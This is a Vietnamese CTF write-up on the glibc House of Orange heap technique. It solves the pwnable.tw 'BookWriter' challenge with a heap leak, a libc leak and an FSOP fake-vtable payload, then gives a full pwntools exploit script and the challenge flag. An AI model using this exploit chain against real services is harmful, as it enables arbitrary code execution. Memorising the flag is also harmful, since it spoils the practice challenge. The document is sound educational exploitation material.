# House of Orange 

- tiếp tục với 1 kĩ thuật mới trong series học heap này đó là House of Orange 

## Research
- giả sử 1 ngày nào đó , bạn gặp 1 chall heap, bạn nhận ra rằng chall đó có malloc nhưng lại không có hàm free, cũng không có hàm tạo shell hay in flag để ta sử dụng **House of Force** nằm orw nó, lúc này buộc ta phải leak libc để tạo shell, thì **House of Orange** là giải pháp cho bạn
- 1 câu hỏi được đặt ra là nếu ta malloc 1 size lớn hơn size của top chunk thì chuyện gì sẽ xảy ra, cùng xem 1 ex này để hiểu hơn nha: 

### Example 

```c
#define fake_size 0x1fe1

int main(void)
{
    void * ptr;

    ptr = malloc (0x10);
    ptr = (void *) ((int) ptr + 24);

    *((long long*)ptr)=fake_size;

    malloc(0x2000);

    malloc(0x60);
}
```
- đầu tiên ta khởi tạo 1 con trỏ ptr và malloc(0x10);
- tiếp theo ta sẽ trỏ ptr đến size top chunk (ptr = (void *) ((int) ptr + 24);)
```c
0x602000:   0x0000000000000000  0x0000000000000021
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1 <== top chunk
0x602030:   0x0000000000000000  0x0000000000000000
```
- thay đổi size top chunk thành từ 0x20fe1 thành size nhỏ hơn là 0x1fe1 (lý do tại sao 0x1fe1 thì lát ở dưới mình sẽ giải thích)
- sau đó ta malloc(0x2000) có size lớn hơn 0x1fe1, ta quan sát vùng nhớ heap trước và sau khi malloc:

```c 
//The original heap
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

//The extended heap
0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]
```
- vùng nhớ heap đã tăng lên từ 0x623000 thành 0x646000, vậy chuyện gì đã xảy ra
- lý do rất đơn giản là khi ta malloc() 1 size lớn hơn size của top chunk, chương trình lập tức sẽ free top chunk đó và phân bổ 1 top chunk mới có size lớn hơn để đáp ứng malloc, và dĩ nhiên rồi, top chunk cũ lúc này sẽ nằm trong unsorted bin sau khi free 

```c 
[+] unsorted_bins[0]: fw=0x602020, bk=0x602020
 →   Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE)
```
- tiếp theo ta malloc(0x60) hay 1 size bất kì nhỏ hơn 0x1fc0(size old top chunk) thì nó sẽ lấy từ unsorted bins ra để phân bổ, lúc này ta hoàn toàn leak libc mà không cần dùng đến hàm free 

```c 
0x602030:   0x00007ffff7dd2208  0x00007ffff7dd2208 <== Unsorted bin list not cleared
0x602040:   0x0000000000602020  0x0000000000602020
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000001f51 <== cutting the remaining new unsorted bin
0x6020a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x6020b0:   0x0000000000000000  0x0000000000000000
```

### Note
- tại sao thay đổi size top chunk thành 0x1fe1 mà ko phải là size khác thì đơn giản thôi nếu bạn sửa thành 1 size khác không hợp lệ nó exit ngay sau lần malloc tiếp theo
- và sau khi mình research thì thấy có 4 quy tắc đặt size cho top như sau 

```
Let's summarize the requirements for forged top chunk size:
1. Forged size must be aligned to the memory page
2. size is greater than MINSIZE (0x10)
3. size is smaller than the chunk size + MINSIZE (0x10) applied afterwards
4. The prev inuse bit of size must be 1
```
- quy tắc 2 ,3 ,4 thì cũng dễ hiểu rồi, còn 1 thì hiểu đơn giản như thế này: nếu size top chunk ban đầu là 0x20fe1 thì ta chỉ có thể thay đổi thành  0x0fe1, 0x1fe1, 0x2fe1, 0x3fe1,... nói chung phải có đuôi 0xfe1
### Reference

- @hlaan: https://hackmd.io/@trhoanglan04/rJxI7P1Dn#House-of-Orange
- Nightmare:https://guyinatuxedo.github.io/43-house_of_orange/house_orange_exp/index.html?fbclid=IwAR0H5zxM7wWrf7jj8mEbZWvOOK0fD03slSMGcQM1nwFM3ID5_gAQpmM0PHw
- Wiki CTF: https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/house_of_orange/?fbclid=IwAR2NWwjeFQsIsCeUrV25SP3Loy3PPqRpCj-1V9onQXDb0pUMoiQo65vYVDA

# Bookwriter

- để hiểu hơn về House of Orange thì ta ứng dụng vào giải chall này luôn 

## ida 

- main
```c 
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("Welcome to the BookWriter !");
  Author();
  while ( 1 )
  {
    menu();
    switch ( input() )
    {
      case 1LL:
        add();
        break;
      case 2LL:
        show();
        break;
      case 3LL:
        edit();
        break;
      case 4LL:
        change();
        break;
      case 5LL:
        exit(0);
      default:
        puts("Invalid choice");
        break;
    }
  }
}
```

- Author
```c
__int64 Author()
{
  printf("Author :");
  return read_func((__int64)&name, 0x40u);
}
```

- add

```c 
int add()
{
  unsigned int i; // [rsp+Ch] [rbp-14h]
  char *page; // [rsp+10h] [rbp-10h]
  __int64 size; // [rsp+18h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 8 )
      return puts("You can't add new page anymore!");
    if ( !(&array)[i] )
      break;
  }
  printf("Size of page :");
  size = input();
  page = (char *)malloc(size);
  if ( !page )
  {
    puts("Error !");
    exit(0);
  }
  printf("Content :");
  read_func((__int64)page, size);
  (&array)[i] = page;
  array1[i] = size;
  ++idx;
  return puts("Done !");
}
```

- show

```c 
int show()
{
  unsigned int idx; // [rsp+Ch] [rbp-4h]

  printf("Index of page :");
  idx = input();
  if ( idx > 7 )
  {
    puts("out of page:");
    exit(0);
  }
  if ( !(&array)[idx] )
    return puts("Not found !");
  printf("Page #%u \n", idx);
  return printf("Content :\n%s\n", (&array)[idx]);
}
```

- edit

```c 
int edit()
{
  unsigned int idx; // [rsp+Ch] [rbp-4h]

  printf("Index of page :");
  idx = input();
  if ( idx > 7 )
  {
    puts("out of page:");
    exit(0);
  }
  if ( !(&array)[idx] )
    return puts("Not found !");
  printf("Content:");
  read_func((__int64)(&array)[idx], array1[idx]);
  array1[idx] = strlen((&array)[idx]);
  return puts("Done !");
}
```

- change

```c 
unsigned __int64 change()
{
  int option; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 canary; // [rsp+8h] [rbp-8h]

  canary = __readfsqword(0x28u);
  option = 0;
  printf("Author : %s\n", name);
  printf("Page : %u\n", (unsigned int)idx);
  printf("Do you want to change the author ? (yes:1 / no:0) ");
  _isoc99_scanf("%d", &option);
  if ( option == 1 )
    Author();
  return __readfsqword(0x28u) ^ canary;
}
```

## Analysis

- đầu tiên chall cho ta nhập name cho Author, check địa chỉ của nama là 0x0000000000602060
- hàm add cho phép ta malloc với size ta nhập vào, sau đó thì nhập content vào chunk đó , chunk addr và size sẽ được lưu vào array[] và array1[], địa chỉ của 2 thằng này lần lượt là 0x00000000006020A0 và 0x00000000006020E0

```python 
name = 0x0000000000602060
array = 0x00000000006020A0
size = 0x00000000006020E0 
```
- hàm show thì in ra content của chunk
- hàm edit thì sửa lại content và cập nhật lại size theo content mới
- hàm change cho phép ta in ra Author, page, content và sửa Author
- nhưng đặc biệt là ở đây không hề có hàm free() hay hàm tạo shell, chà căng ta

## Exploit 

### Stage 1: leak heap

- đầu tiên có điều khá thú vị mà ko để ý đó là 3 thằng name, array, size đều nằm gần nhau 

![image](https://github.com/gookoosss/CTF/assets/128712571/223bd1ae-68f6-42b5-862f-b469056c8403)


- nếu ta fill up thằng name nó sẽ nối liền với địa chỉ heap của thằng page, lúc này dùng change() để in ra Author và leak heap 

```python 
p.sendlineafter(b'Author :', b'a'*64)
add(0x18, b'a')
p.sendlineafter(b'choice :', b'4')
p.recvuntil(b'a'*64)
heap = u64(p.recv(4) + b'\0\0\0\0') - 0x10
print(hex(heap))
```

### Stage 2: Leak libc by House of Orange 

- có 1 bug khá khó thấy đó là ở edit(), size được cập nhật lại bằng hàm strlen()
- nếu ta để size là 0x18, sau đó orw chunk bằng 0x18 byte a, điều này làm nó nối tiếp với size top chunk, mà strlen() xét đến khi gặp null byte, vô tình thay đổi size = 0x18(byte a) + 0x3(size top chunk) = 0x1b

![image](https://github.com/gookoosss/CTF/assets/128712571/9aeb4d86-7c38-4f31-af01-949b2a45e5e7)

![image](https://github.com/gookoosss/CTF/assets/128712571/d642ffa1-ab7e-4550-b18a-eda54eef5bd4)

- lúc này size = 0x1b => ta có thể orw size top chunk => House of Orange 
- sau đó ta malloc 1 size bất kì để leak libc 

```python 
p.sendlineafter(b'Author :', b'a'*64)
add(0x18, b'a')
edit(0, b'a'*0x18)
edit(0,b'\0'*0x18 + b'\xe1\x0f\x00')
p.sendlineafter(b'choice :', b'4')
p.recvuntil(b'a'*64)
heap = u64(p.recv(4) + b'\0\0\0\0') - 0x10
print(hex(heap))
p.sendlineafter(b'no:0) ', b'0')
add(0x78, b'a'*8)
show(1)
p.recvuntil(b'a'*8)
libc.address= u64(p.recv(6) + b'\0\0') - 0x3c4188
print(hex(libc.address))
system = libc.sym.system
io_list_all = libc.sym._IO_list_all
print(hex(system))
print(hex(io_list_all))
```

### Stage 3: Attack unsorted bins by FSOP 

- đến bước này rất khó nên mình đành phải tham khảo wu và hướng dẫn của how2heap mà làm theo :))
- Nightmare: https://guyinatuxedo.github.io/43-house_of_orange/house_orange_exp/index.html?fbclid=IwAR0H5zxM7wWrf7jj8mEbZWvOOK0fD03slSMGcQM1nwFM3ID5_gAQpmM0PHw
- đầu tiên thì để làm fake IO_FILE thì cần orw thoải mái, vì vậy ta cần fake size của page idx 0 trước 
- điều này khá đơn giản khi ta chỉ cần tạo ra 9 page là được, địa chỉ page thứ 9 sẽ orw vào size của page 0, lúc này ta thoải mái orw rồi 

![image](https://github.com/gookoosss/CTF/assets/128712571/126b15c2-eb67-4a6e-8f8b-0c00010fed28)


- giờ thì ta làm chill chill theo hướng dẫn ở trên thôi :))

```
// Now we will prep for an unsorted bin attack here
// For this, we will write to the first value in _IO_list_all the start of the unsorted bin, main_arena+88
// This value is a ptr to the first chunk in the unsorted bin, which will be the old top chunk we have an overflow to
// In this case this chunk gets split up to serve allocation requests (which it will) the bk chunk's fwd pointer gets overwritten with the unsorted bin list
// In other words topChunk->bk->fwd = unsorted bin list (which is a ptr to the old top chunk)
```
- đoạn này hiểu là thằng top chunk cũ đang trong usorted bin là main_arena+88, ta sẽ FSOP tại đây
- vì vậy ta sẽ tính offset từ page 0 đến old top chunk là 0x170 

```c 
// Now we will finally set up the _IO_FILE struct, which will overlap with the old top chunk currently in the unsorted bin
// However the first 8 bytes, we will write our input a pointer to it will be passed to the instruction pointer we are calling

    memcpy(topChunk, "/bin/sh", 8);
```
- hmm đoạn này hiểu là topChunk[0] = '/bin/sh\0'

```c 
    // Now the next thing we will need to set is the size of the old top chunk
    // We will shrink it down to the size of a small bin chunk, specifically 0x61
    // This will serve two purposes
    // When malloc scans through the unsorted bin and sees this chunk, it will try to insert it into small bin 4 due to its size
    // So this chunk will also end up at the head of the small bin 4 list, as we can see here in memory:

    /*
    gef➤  x/10g 0x7ffff7dd1b78
    0x7ffff7dd1b78 <main_arena+88>:    0x624010    0x0
    0x7ffff7dd1b88 <main_arena+104>:    0x602400    0x7ffff7dd2510
    0x7ffff7dd1b98 <main_arena+120>:    0x7ffff7dd1b88    0x7ffff7dd1b88
    0x7ffff7dd1ba8 <main_arena+136>:    0x7ffff7dd1b98    0x7ffff7dd1b98
    0x7ffff7dd1bb8 <main_arena+152>:    0x7ffff7dd1ba8    0x7ffff7dd1ba8
    gef➤  x/4g 0x6023f0
    0x6023f0:    0x0    0x0
    0x602400:    0x68732f6e69622f    0x61
    */
    topChunk[1] = 0x61;
```
- đoạn này hiểu là ta set size cho top chunk là 0x61, có 2 lý do chính
- 1 là khi top chunk có size 0x61 phù hợp với size smallbins
- 2 khi malloc(), chương trình sẽ quét qua unsorted bins và đẩy top chunk xuống smallbins , điều này làm top chunk đứng đầu list của smallbins 
- từ 1 và 2 suy ra: 

```c 
// This will give us a wrote to the fwd pointer of the value we will write to _IO_list_all (which so happens to overlap with small bin 4), since currently our only write is an unsorted bin attack
// Also this will cause it to fail a check, when it checks the size of the false fwd chunk (which will be 0), which will cause malloc_printerr to be called
```
- đến topChunk[3] = _IO_list_all - 0x10;
```c 
// In this case this chunk gets split up to serve allocation requests (which it will) the bk chunk's fwd pointer gets overwritten with the unsorted bin list
    // In other words topChunk->bk->fwd = unsorted bin list (which is a ptr to the old top chunk)

    topChunk[3] = _IO_list_all - 0x10;
``` 

```c 
// Set the write base to 2, and the write ptr to 3
    // We have to pass the check the the write ptr is greater than the write base

    fakeFp->_IO_write_base = (char *) 2;
    fakeFp->_IO_write_ptr = (char *) 3;    
```
- ở đây đơn giản set topChunk[4] = 2 (the write base) và topChunk[5] = 3 (the write ptr) 

```c 
 // Set mode to 0
    fakeFp->_mode = 0;
```
- **padding ljust(0xc0,b'\x00'** và set p64(0)

```c 
    // Next up we make our jump table
    // This is where our instruction pointer will be called
    // In here I will be setting the instruction pointer equal to the address of pwn
    // However since we have a libc infoleak, we in practice could just set it to system

    unsigned long *jmpTable = &topChunk[12];
    jmpTable[3] = (unsigned long) &pwn;
    *(unsigned long *) ((unsigned long) fakeFp + sizeof(_IO_FILE)) = (unsigned long) jmpTable;

```
- đoạn này ta set up cho fake vtable 

```python 
padding = b'\0' * 0x170

payload = b'/bin/sh\0' + p64(0x61) #180 #188
payload += p64(0xdeadbeef) + p64(io_list_all - 0x10) #190 #198
payload += p64(2) + p64(3) #d1a0 #d1a8
# payload = payload.ljust(0xc0,b'\x00') + p64(0) #238 #240
payload = payload.ljust(0xd8,b'\x00') #padding

vtable = p64(0)*3 + p64(system)

vtable_addr = heap + 0x180 + 0xe0 #260

payload += p64(vtable_addr) + vtable #258 #260
edit(0,padding + payload)
```

- cuối cùng malloc 1 chunk bất kì và lấy shell 


![image](https://github.com/gookoosss/CTF/assets/128712571/74ae7cd3-546c-4b07-83fa-f9728e9b8bfe)


## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./bookwriter_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

p = remote('chall.pwnable.tw', 10304)
# p = process([exe.path])
# gdb.attach(p, gdbscript = '''
# b*0x00000000004009FE
# b*0x0000000000400EE0
# b*0x0000000000400BAD
# b*0x0000000000400F14
# b*0x0000000000400F09
# c
# ''')

# input()
def add(size, data):
    p.sendlineafter(b'choice :', b'1')
    p.sendlineafter(b'page :', str(size))
    p.sendafter(b'Content :', data)

def show(idx):
    p.sendlineafter(b'choice :', b'2')
    p.sendlineafter(b'page :', str(idx))
  

def edit(idx, data):
    p.sendlineafter(b'choice :', b'3')
    p.sendlineafter(b'page :', str(idx))
    p.sendafter(b'Content:', data)

def change(data):
    p.sendlineafter(b'choice :', b'2')
    p.sendlineafter(b'no:0) ', b'1')
    p.sendlineafter(b'Author :', data)


name = 0x0000000000602060
array = 0x00000000006020A0
size = 0x00000000006020E0 
p.sendlineafter(b'Author :', b'a'*64)
add(0x18, b'a')
edit(0, b'a'*0x18)
edit(0,b'\0'*0x18 + b'\xe1\x0f\x00')
p.sendlineafter(b'choice :', b'4')
p.recvuntil(b'a'*64)
heap = u64(p.recv(4) + b'\0\0\0\0') - 0x10
print(hex(heap))
p.sendlineafter(b'no:0) ', b'0')
add(0x78, b'a'*8)
show(1)
p.recvuntil(b'a'*8)
libc.address= u64(p.recv(6) + b'\0\0') - 0x3c4188
print(hex(libc.address))
system = libc.sym.system
io_list_all = libc.sym._IO_list_all
print(hex(system))
print(hex(io_list_all))

for i in range(7):
    add(0x18, b'b'*4)

padding = b'\0' * 0x170

payload = b'/bin/sh\0' + p64(0x61) #180 #188
payload += p64(0xdeadbeef) + p64(io_list_all - 0x10) #190 #198
payload += p64(2) + p64(3) #d1a0 #d1a8
# payload = payload.ljust(0xc0,b'\x00') + p64(0) #238 #240
payload = payload.ljust(0xd8,b'\x00') #padding

vtable = p64(0)*3 + p64(system)

vtable_addr = heap + 0x180 + 0xe0 #260

payload += p64(vtable_addr) + vtable #258 #260
edit(0,padding + payload)
p.sendlineafter(b'choice :', b'1')
p.sendlineafter(b'page :', str(20))
p.interactive()

#FLAG{Th3r3_4r3_S0m3_m4gic_in_t0p}
```

## FLAG

FLAG{Th3r3_4r3_S0m3_m4gic_in_t0p}
